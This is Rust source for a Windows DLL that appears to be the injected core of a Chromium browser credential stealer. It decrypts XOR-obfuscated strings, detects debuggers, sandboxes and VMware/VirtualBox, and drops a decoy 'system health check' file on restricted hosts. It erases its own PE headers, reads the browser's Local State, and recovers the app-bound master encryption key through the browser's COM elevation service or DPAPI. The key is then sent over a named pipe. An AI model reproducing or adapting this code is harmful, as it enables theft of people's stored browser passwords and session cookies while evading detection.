#![allow(non_snake_case, unused)]

mod elevator;
mod dpapi_fallback;
mod pipe;
mod reflect;

use core::arch::asm;
use std::ffi::c_void;
use std::path::PathBuf;
use std::thread;
use std::time::Duration;

use windows::Win32::{
    Foundation::{BOOL, HINSTANCE, TRUE},
    System::{
        Diagnostics::Debug::IsDebuggerPresent,
        SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX},
        SystemServices::DLL_PROCESS_ATTACH,
        Threading::{CreateThread, THREAD_CREATION_FLAGS},
    },
};

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;

/// Parameters passed from the injector into `Bootstrap`.
#[repr(C)]
pub struct BootstrapParams {
    pub pipe_name: *const u16,
    pub image_base: *mut c_void,
    pub image_size: usize,
}

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_appb() -> Vec<u8> {
    xor_str(&[0x1B, 0x0A, 0x0A, 0x18]).into_bytes()
}

fn s_user_data_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x0F, 0x29, 0x3F, 0x28, 0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x1F, 0x16,
    ])
}

fn s_data_root_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x15, 0x15, 0x0E,
    ])
}

fn s_roaming() -> String {
    xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
}

fn s_appdata() -> String {
    xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_localappdata() -> String {
    xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_local_state() -> String {
    xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F])
}

fn s_os_crypt_path() -> String {
    xor_str(&[
        0x75, 0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x75, 0x3B, 0x2A, 0x2A, 0x05, 0x38,
        0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05,
        0x31, 0x3F, 0x23,
    ])
}

fn s_browser_name_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x14, 0x3B, 0x37, 0x3F,
    ])
}

fn s_chromium() -> String {
    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37])
}

fn s_decoy_name() -> String {
    xor_str(&[
        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_decoy_body() -> String {
    xor_str(&[
        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F, 0x3E, 0x7A,
        0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23, 0x74, 0x50,
    ])
}

struct EnvGuard;

impl Drop for EnvGuard {
    fn drop(&mut self) {
        let _ = std::env::remove_var(s_user_data_env());
        let _ = std::env::remove_var(s_data_root_env());
    }
}

fn is_debugger_attached() -> bool {
    unsafe { IsDebuggerPresent().as_bool() }
}

#[cfg(target_arch = "x86_64")]
fn rdtsc_anomaly() -> bool {
    let (t0, t1) = unsafe {
        let a: u64;
        let b: u64;
        asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") a,
            lateout("rdx") _,
        );
        for _ in 0..512 {
            core::hint::black_box(0u8);
        }
        asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") b,
            lateout("rdx") _,
        );
        (a, b)
    };
    t1.saturating_sub(t0) > 500_000
}

#[cfg(not(target_arch = "x86_64"))]
fn rdtsc_anomaly() -> bool {
    false
}

fn is_restricted_host() -> bool {
    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_ok() && status.ullTotalPhys < MIN_MEMORY_BYTES {
            return true;
        }
    }
    if thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
    {
        return true;
    }
    let drivers = std::env::var("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
        .join("System32")
        .join("drivers");
    [
        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x1D, 0x09, 0x1F, 0x2E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
    ]
    .iter()
    .any(|name| drivers.join(name).exists())
}

fn run_decoy() {
    let _ = std::fs::write(std::env::temp_dir().join(s_decoy_name()), s_decoy_body());
}

/// Reflective entry point invoked by the injector via `NtCreateThreadEx`.
/// Performs PE mapping (relocations/imports), connects to the named pipe, and
/// runs the COM elevation workflow.
#[no_mangle]
pub unsafe extern "C" fn Bootstrap(params: *const BootstrapParams) -> u32 {
    if params.is_null() {
        return 1;
    }
    let p = &*params;
    if p.image_base.is_null() || p.image_size == 0 {
        return 1;
    }

    if is_debugger_attached() || rdtsc_anomaly() {
        thread::sleep(Duration::from_secs(30));
        return 1;
    }
    if is_restricted_host() {
        run_decoy();
        return 1;
    }

    if reflect::load_pe(p.image_base, p.image_size).is_err() {
        let _ = pipe::connect_pipe_name(p.pipe_name).and_then(|c| {
            c.send_error(&xor_str(&[
                0x28, 0x3F, 0x36, 0x3F, 0x39, 0x2E, 0x33, 0x3C, 0x3F, 0x7A, 0x36, 0x35, 0x3B, 0x3E,
                0x7A, 0x3C, 0x3B, 0x33, 0x36, 0x3F, 0x3E,
            ]))
        });
        return 1;
    }

    reflect::destroy_pe_headers(p.image_base);

    match run_with_pipe(p) {
        Ok(()) => 0,
        Err(e) => {
            let _ = pipe::connect_pipe_name(p.pipe_name).and_then(|c| c.send_error(&e));
            1
        }
    }
}

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        CreateThread(None, 0, Some(legacy_worker), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

unsafe extern "system" fn legacy_worker(_: *mut c_void) -> u32 {
    0
}

unsafe fn run_with_pipe(params: &BootstrapParams) -> Result<(), String> {
    let _env_guard = EnvGuard;
    thread::sleep(Duration::from_millis(200));

    let client = pipe::connect_pipe_name(params.pipe_name)
        .map_err(|_| String::from("pipe connect failed"))?;
    client
        .send_status("connected")
        .map_err(|_| String::from("pipe status failed"))?;

    let r = std::panic::catch_unwind(|| run_core(&client));
    match r {
        Ok(Ok(key_hex)) => {
            let browser = std::env::var(s_browser_name_env()).unwrap_or_else(|_| s_chromium());
            client
                .send_result(&key_hex, &browser)
                .map_err(|_| String::from("pipe result failed"))?;
            Ok(())
        }
        Ok(Err(e)) => {
            let _ = client.send_error(&e);
            Err(e)
        }
        Err(_) => {
            let msg = String::from("panic");
            let _ = client.send_error(&msg);
            Err(msg)
        }
    }
}

fn run_core(client: &pipe::PipeClient) -> Result<String, String> {
    client
        .send_status("reading local state")
        .map_err(|_| String::from("pipe status failed"))?;

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("read Local State: {e}"))?;
    let ls: serde_json::Value = serde_json::from_str(&raw)
        .map_err(|e| format!("parse Local State: {e}"))?;

    let key_b64 = ls
        .pointer(&s_os_crypt_path())
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            xor_str(&[
                0x3B, 0x2A, 0x2A, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05,
                0x31, 0x3F, 0x23, 0x7A, 0x34, 0x35, 0x2E, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E,
            ])
        })?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    )
    .map_err(|e| format!("base64 decode: {e}"))?;

    let appb = s_appb();
    if encrypted_key.len() < appb.len() {
        return Err(xor_str(&[
            0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x7A, 0x31, 0x3F, 0x23, 0x7A,
            0x2E, 0x35, 0x35, 0x7A, 0x29, 0x32, 0x35, 0x28, 0x2E,
        ]));
    }
    if !encrypted_key.starts_with(&appb) {
        return Err(xor_str(&[
            0x37, 0x33, 0x29, 0x29, 0x33, 0x34, 0x3D, 0x7A, 0x1B, 0x0A, 0x0A, 0x18, 0x7A, 0x2A,
            0x28, 0x3F, 0x3C, 0x33, 0x22,
        ]));
    }
    let encrypted_key = &encrypted_key[appb.len()..];

    client
        .send_status("calling com server")
        .map_err(|_| String::from("pipe status failed"))?;

    let browser = elevator::resolve_browser(&exe);
    let com_result = match browser {
        Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
            .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
        None => elevator::decrypt_app_bound_key(encrypted_key),
    };

    let master_key = com_result
        .or_else(|_| {
            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
                .ok_or_else(|| String::from("dpapi fallback failed"))
        })
        .map_err(|e| format!("key recovery: {e}"))?;

    if master_key.len() != 32 {
        return Err(format!(
            "unexpected key length: {} (want 32)",
            master_key.len()
        ));
    }

    client
        .send_status(&xor_str(&[0x31, 0x3F, 0x23, 0x7A, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x3E, 0x3F, 0x3E]))
        .map_err(|_| xor_str(&[0x33, 0x2A, 0x39, 0x7A, 0x29, 0x2E, 0x3B, 0x2E, 0x2F, 0x29]))?;

    let hex = master_key.iter().map(|b| format!("{b:02x}")).collect::<String>();
    Ok(hex)
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    if let Ok(rel) = std::env::var(s_user_data_env()) {
        let root = match std::env::var(s_data_root_env()).as_deref() {
            Ok(v) if v == s_roaming() => std::env::var(s_appdata()),
            _ => std::env::var(s_localappdata()),
        }
        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;

        let path = PathBuf::from(&root).join(rel).join(s_local_state());
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("Local State not found: {}", path.display()));
    }

    let browser = elevator::resolve_browser(exe)
        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;

    let local_appdata = std::env::var(s_localappdata()).map_err(|_| "LOCALAPPDATA not set")?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(&browser.user_data_rel)
        .join(s_local_state());

    if !local_state_path.exists() {
        return Err(format!(
            "Local State not found: {}",
            local_state_path.display()
        ));
    }

    Ok(local_state_path)
}
